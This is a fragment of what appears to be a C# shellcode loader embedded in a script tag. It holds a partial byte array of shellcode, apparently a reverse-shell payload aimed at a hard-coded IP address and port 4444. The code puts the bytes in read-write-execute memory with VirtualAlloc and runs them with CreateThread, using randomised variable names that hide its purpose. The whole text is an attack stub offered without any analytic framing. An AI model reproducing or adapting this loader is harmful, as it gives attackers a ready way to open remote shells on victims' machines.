...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x10,0xb9,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr uWIuZU = VirtualAlloc(IntPtr.Zero,(UIntPtr)rhF.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(rhF,0,uWIuZU,rhF.Length);
        IntPtr niHhyE432b = IntPtr.Zero;
        IntPtr qrRvmf = CreateThread(IntPtr.Zero,UIntPtr.Zero,uWIuZU,IntPtr.Zero,0,ref niHhyE432b);
    }
</script>
